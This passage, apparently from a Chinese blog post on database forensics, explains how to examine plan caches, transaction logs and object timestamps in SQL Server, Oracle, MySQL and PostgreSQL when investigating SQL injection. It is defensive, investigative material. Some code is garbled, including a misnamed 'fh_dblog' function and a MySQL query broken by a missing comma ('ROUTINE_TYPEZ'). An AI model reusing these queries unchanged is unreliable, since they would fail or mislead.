&lt;li&gt;&lt;p&gt;执行计划重用的频率&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;缓存执行计划中引用的对象发生了改变&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;重启数据库服务&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;手工清洗缓存&#34;&gt;&lt;a href=&#34;#手工清洗缓存&#34; class=&#34;headerlink&#34; title=&#34;手工清洗缓存&#34;&gt;&lt;/a&gt;手工清洗缓存&lt;/h6&gt;&lt;p&gt;具有管理员权限的用户可以使用手工方式清洗数据库的执行计划缓存。&lt;/p&gt;
&lt;p&gt;采用参数化处理可以提高RDBMS重用缓存计划的机会，以便将来遇到同样的查询时可以更快地执行。下面是一个参数化查询的例子：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; EmployeeID&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; FName&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; LName&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; YOB &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; SSFA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Employee &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;fname&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;mike&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;事务日志&#34;&gt;&lt;a href=&#34;#事务日志&#34; class=&#34;headerlink&#34; title=&#34;事务日志&#34;&gt;&lt;/a&gt;事务日志&lt;/h5&gt;&lt;p&gt;数据库操作分为两个主要的类别：一是数据操作语言(Data Manipulation Language, DML)， 二是数据定义语言(Data Definition Language, DDL)。DML作用于表内的数据；而DDL则作用于数据库的结构，比如创建新表。&lt;/p&gt;
&lt;p&gt;事务日志(transaction log)用于记录这样的事实：事务开始发生及恢复所需的信息。万一数据库服务器将信息写入硬盘失败，数据库服务器就可以使用这些恢复信息将数据回退到某个一致的状态。&lt;/p&gt;
&lt;p&gt;将数据写入实际的数据页(data page)并不是实时发生的。在预定义的时间间隔之后，事务 日志中的信息才会应用于硬盘，这等同于数据的写入操作，但却提高了总体的性能。这听起来 很复杂，但与RDBMS在巨大的数据库文件中寻道并在恰当区域中写入信息相比，写入事务曰 志的速度要快许多。&lt;/p&gt;
&lt;h6 id=&#34;在事务日志中查找证据&#34;&gt;&lt;a href=&#34;#在事务日志中查找证据&#34; class=&#34;headerlink&#34; title=&#34;在事务日志中查找证据&#34;&gt;&lt;/a&gt;在事务日志中查找证据&lt;/h6&gt;&lt;p&gt;分析事务日志&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在可疑攻击时间段内执行的INSERT, UPDATE和DELETE语句。在调查取证时，该信息可用于标识在所调查的时间段内执行的活动，以及相关事件的其他痕迹。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;数据库用户执行的非标准的数据库操作(当事务日志中有可用信息时)。例如，某个通常从数据库读取信息的应用程序用户账号突然意外地开始执行INSERT、UPDATE和 DELETE 语句。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;如何搜索主流RDBMS的事务日志&#34;&gt;&lt;a href=&#34;#如何搜索主流RDBMS的事务日志&#34; class=&#34;headerlink&#34; title=&#34;如何搜索主流RDBMS的事务日志&#34;&gt;&lt;/a&gt;如何搜索主流RDBMS的事务日志&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Microsoft SQL Server &lt;/p&gt;
&lt;p&gt;默认情况下，Microsoft SQL Server的事务日志功能是启用的，而且无法禁用。从任何SQL Server客户端，都可以使用原生的fh_dblog函数来访问事务日志。&lt;/p&gt;
&lt;p&gt;列出了针对用户表已经执行事务的汇总信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; AllocUnitName &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Object&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Operation&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;OPERATION&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;Count&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; fn_dblog&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; OPERATION &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;LOP_INSERT_ROWS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;LOP_MODIFY_ROW&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;LOP_DELETE_ROWS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; AllocUnitName &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;Like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;sys.%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;GROUP&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; Operation&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; AllocUnitName &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; Object&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Operation&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Oracle&lt;/p&gt;
&lt;p&gt;在Oracle中，事务(归档)日志默认是启用的，并且在测试系统时也无法禁用事务日志功能。&lt;/p&gt;
&lt;p&gt;使用下面的查询返回已执行的INSERT、UPDATE和DELETE操作的一个列表：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; OPERATION&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; SQL_REDO&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; SQL_UNDO &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; V$LOGMNR_CONTENTS &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt;
SEG_OWNER &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;WEBAPP&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; SEG_NAME &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SYNGRESS&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;timestamp&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; sysdate &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;timestamp&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; sysdate&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; OPERATION &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;DELETE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;INSERT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;UPDATE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; USERNAME &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;KEWIE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MySQL&lt;/p&gt;
&lt;p&gt;在MySQL中，默认情况下不启用事务日志，为了记录事务，必须用命令启用事务日志功能。&lt;/p&gt;
&lt;p&gt;使用show binary logs语句来查看是否激活了事务日志功能&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SHOW&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BINARY&lt;/span&gt; LOGS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用下面的查询来确定事务日志存储的位置&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SHOW&lt;/span&gt; VARIABLES &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%HOME%&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如何返回DB_BIN_Log.000002文件中的所有事务记录&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;mysqlbinlog &lt;span class=&#34;token string&#34;&gt;&#34;c:\Program Files\MySQL\DB_Bin_Logs.000002&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; z:\transactionlog&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;PostgreSQL&lt;/p&gt;
&lt;p&gt;可以使用PostgreSQL命令行客户端来返回事务日志信息。在PostgreSQL中，事务日志默认是不启用的，在启用了 PostgreSQL的事务日志之后，也可以再将其禁用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;数据库对象的时间戳&#34;&gt;&lt;a href=&#34;#数据库对象的时间戳&#34; class=&#34;headerlink&#34; title=&#34;数据库对象的时间戳&#34;&gt;&lt;/a&gt;数据库对象的时间戳&lt;/h5&gt;&lt;p&gt;在调查取证期间，生成关键对象和相应时间戳的列表是个好办法，这可以在可疑攻击时间段内标识对象的创建和修改活动。在调查可疑的SQL注入攻击时，请注意下列常常与攻击有关的活动：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;创建用户账号，这通常用于创建访问的后门。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;为已有账号增加权限，这通常是执行权限提升的一部分操作。 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;创建表，新创建的表通常用于在将信息返回给攻击者之前，存储中间结果。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;SQL-Server-4&#34;&gt;&lt;a href=&#34;#SQL-Server-4&#34; class=&#34;headerlink&#34; title=&#34;SQL Server&#34;&gt;&lt;/a&gt;SQL Server&lt;/h6&gt;&lt;p&gt;下面的查询将返回当前数据库中视图、过程、函数、表和扩展过程的一个列表，并按照修改日期和创建日期以降序方式排序：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sob&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;object&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sch&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;schema&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; type_desc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; create_date&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; modify_date &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;all_objects sob&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;schemas sch &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; sob&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;schema_id &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sch&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;schema_id &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; sob&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;V&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;P&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FN&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;U&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;S&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;IT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;X&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Db_User&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; createdate&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; updatedate &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysusers&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Login&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; createdate&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; updatedate &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;syslogins&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;Oracle-8&#34;&gt;&lt;a href=&#34;#Oracle-8&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h6&gt;&lt;p&gt;在Oracle中，可以使用下面的查询返回当前数据库中数据库对象类型的一个列表，比如表、视图和过程，并按照修改日期和创建日期以降序方式排序：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; object_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; object_id&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; object_type&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; created&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; last_DDL_time &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_objects &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; LAST_DDL_time &lt;span class=&#34;token keyword&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; created &lt;span class=&#34;token keyword&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;MySQL-3&#34;&gt;&lt;a href=&#34;#MySQL-3&#34; class=&#34;headerlink&#34; title=&#34;MySQL&#34;&gt;&lt;/a&gt;MySQL&lt;/h6&gt;&lt;p&gt;当使用MySQL数据库时，应该注意对于某些对象比如触发器和视图并不存储时间戳。运行下面的查询，没有时间戳的对象将返回NULL值作为时间戳列的值&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; TABLE_NAME &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;OBJECT&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; TABLE_SCHEMA &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;OBJECT_SCHEMA&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
TABLE_TYPE &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;OBJECT_TYPE&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; CREATE_TIME&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; UPDATE_TIME &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt;
information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; SPECIFIC_NAME&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ROUTINE_SCHEMA&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ROUTINE_TYPEZ CREATED&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; LAST_ALTERED &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;routines &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; ROUTINE_TYPE &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;PROCEDURE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;DB_USER&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;	&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;	&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; mysql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;PostgreSQL-6&#34;&gt;&lt;a href=&#34;#PostgreSQL-6&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h6&gt;&lt;p&gt;对于创建的对象、表和用户等，PostgreSQL并不记录它们的时间戳信息。可以使用下面的查询，返回当前数据库中关键对象的名称、模式和类型。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; proname &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;OBJECT_NAME&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;OBJECT_SCHEMA&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;PROCEDURE&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#34;OBJECT_TYPE&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_proc &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; tgname&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;TRIGGER&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_trigger
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; tablename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; schemaname&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;TABLE&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_tables &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; usename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;USER&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_user  &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

